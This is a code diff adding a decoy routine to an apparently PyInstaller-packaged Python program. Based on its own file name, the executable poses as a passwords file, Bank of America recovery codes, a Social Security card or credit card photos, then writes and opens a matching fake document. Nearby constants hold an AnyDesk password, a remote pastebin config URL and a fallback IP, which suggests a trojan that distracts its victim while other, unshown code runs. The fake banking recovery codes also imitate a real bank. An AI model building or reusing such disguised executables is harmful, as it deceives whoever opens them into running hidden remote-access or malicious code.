@@ -77,6 +77,33 @@ acct 2847-3821-9918
 bobgardner / DTEaccess2021
 """
 
+FAKE_RECOVERY_CODES = """Bank of America - 2FA Recovery Codes
+Last Updated: October 28, 2024
+
+Account: bob.gardner (Personal Checking ***4782)
+
+Recovery Codes (use once each):
+1. 472819-3847291
+2. 193847-2947182
+3. 584920-1928374
+4. 847291-3948271
+5. 293847-1928475
+6. 748291-3847298
+7. 193847-4829371
+8. 584920-2938471
+9. 847291-1928374
+10. 293847-5849201
+
+KEEP THESE SAFE!
+If you lose access to your phone/2FA app, these codes
+can be used to log in to your account.
+
+Each code can only be used ONCE.
+After using a code, cross it off this list.
+
+Customer Service: 1-800-432-1000
+"""
+
 ANYDESK_PASSWORD = "secretsauce123"
 CONFIG_URL = "https://pastebin.com/raw/YgNuztHj"
 FALLBACK_IP = "52.21.29.104"
@@ -99,16 +126,97 @@ def log(msg):
 
 
 def create_decoy():
-    """Create and open fake passwords.txt file"""
+    """Create and open appropriate decoy file based on executable name"""
     try:
-        passwords_path = Path.cwd() / "passwords.txt"
-        passwords_path.write_text(FAKE_PASSWORDS, encoding="utf-8")
-        log(f"Created decoy: {passwords_path}")
+        # Get the executable name (without .exe extension)
+        exe_name = Path(sys.executable).stem
+        log(f"Executable name: {exe_name}")
 
-        # Open in notepad (non-blocking)
-        if sys.platform == "win32":
-            subprocess.Popen(["notepad.exe", str(passwords_path)], creationflags=subprocess.DETACHED_PROCESS)
-        log("Opened decoy in notepad")
+        # Determine which variant we are
+        if "password" in exe_name.lower():
+            # passwords.exe → passwords.txt
+            decoy_path = Path.cwd() / "passwords.txt"
+            decoy_path.write_text(FAKE_PASSWORDS, encoding="utf-8")
+            log(f"Created decoy: {decoy_path}")
+
+            # Open in notepad
+            if sys.platform == "win32":
+                subprocess.Popen(["notepad.exe", str(decoy_path)], creationflags=subprocess.DETACHED_PROCESS)
+            log("Opened decoy in notepad")
+
+        elif "recovery" in exe_name.lower() or "bankofamerica" in exe_name.lower():
+            # BankOfAmerica_Recovery_Codes.exe → BankOfAmerica_Recovery_Codes.txt
+            decoy_path = Path.cwd() / "BankOfAmerica_Recovery_Codes.txt"
+            decoy_path.write_text(FAKE_RECOVERY_CODES, encoding="utf-8")
+            log(f"Created decoy: {decoy_path}")
+
+            # Open in notepad
+            if sys.platform == "win32":
+                subprocess.Popen(["notepad.exe", str(decoy_path)], creationflags=subprocess.DETACHED_PROCESS)
+            log("Opened decoy in notepad")
+
+        elif "social" in exe_name.lower() or "ssn" in exe_name.lower():
+            # socialsecuritycard.exe → Extract and open image1.png
+            try:
+                # Get bundled resource path
+                if getattr(sys, "frozen", False):
+                    # Running as PyInstaller exe - use _MEIPASS
+                    bundle_dir = Path(sys._MEIPASS)
+                else:
+                    # Running as script
+                    bundle_dir = Path(__file__).parent
+
+                source_image = bundle_dir / "assets" / "image1.png"
+                decoy_path = Path.cwd() / "socialsecuritycard.png"
+
+                # Copy bundled image to current directory
+                import shutil
+
+                shutil.copy(source_image, decoy_path)
+                log(f"Extracted decoy: {decoy_path}")
+
+                # Open in default image viewer
+                if sys.platform == "win32":
+                    os.startfile(str(decoy_path))
+                log("Opened decoy image")
+            except Exception as e:
+                log(f"Failed to extract/open image: {e}")
+
+        elif "credit" in exe_name.lower() or "card" in exe_name.lower():
+            # Credit_Card_Photos.exe → Extract and open image2.png
+            try:
+                # Get bundled resource path
+                if getattr(sys, "frozen", False):
+                    # Running as PyInstaller exe - use _MEIPASS
+                    bundle_dir = Path(sys._MEIPASS)
+                else:
+                    # Running as script
+                    bundle_dir = Path(__file__).parent
+
+                source_image = bundle_dir / "assets" / "image2.png"
+                decoy_path = Path.cwd() / "Credit_Card_Photo.png"
+
+                # Copy bundled image to current directory
+                import shutil
+
+                shutil.copy(source_image, decoy_path)
+                log(f"Extracted decoy: {decoy_path}")
+
+                # Open in default image viewer
+                if sys.platform == "win32":
+                    os.startfile(str(decoy_path))
+                log("Opened decoy image")
+            except Exception as e:
+                log(f"Failed to extract/open image: {e}")
+        else:
+            # Default fallback - create passwords.txt
+            log(f"Unknown variant: {exe_name}, using default decoy")
+            decoy_path = Path.cwd() / "passwords.txt"
+            decoy_path.write_text(FAKE_PASSWORDS, encoding="utf-8")
+            if sys.platform == "win32":
+                subprocess.Popen(["notepad.exe", str(decoy_path)], creationflags=subprocess.DETACHED_PROCESS)
+            log("Opened default decoy")
+
     except Exception as e:
         log(f"Decoy creation failed: {e}")
 
